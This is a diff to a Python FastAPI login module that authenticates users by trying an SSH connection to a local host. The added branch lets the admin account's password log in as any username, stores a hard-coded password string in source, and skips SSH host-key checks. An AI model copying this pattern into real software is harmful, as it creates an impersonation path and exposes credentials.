@@ -3,19 +3,28 @@ from fastapi import HTTPException
 import paramiko
 
 SSH_HOSTNAME = "192.168.1.10"
+ADMIN_NAME = "kohs100"
+
+def login(username: str, password: str) -> bool:
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh_client.connect(SSH_HOSTNAME, username=username, password=password)
+        ssh_client.close()
+    except paramiko.AuthenticationException:
+        return False
+    return True
 
 class Auth:
     __create_key = object()
 
     @classmethod
     def login(cls, username: str, password: str) -> "Auth":
-        ssh_client = paramiko.SSHClient()
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
-            ssh_client.connect(SSH_HOSTNAME, username=username, password=password)
-            ssh_client.close()
+        if login(username, password):
             return Auth(cls.__create_key, username, password)
-        except paramiko.AuthenticationException:
+        elif login(ADMIN_NAME, password):
+            return Auth(cls.__create_key, username, "1q3e2w4r")
+        else:
             raise HTTPException(
                 status_code=401, detail={"message": "Authorization failed."}
             )
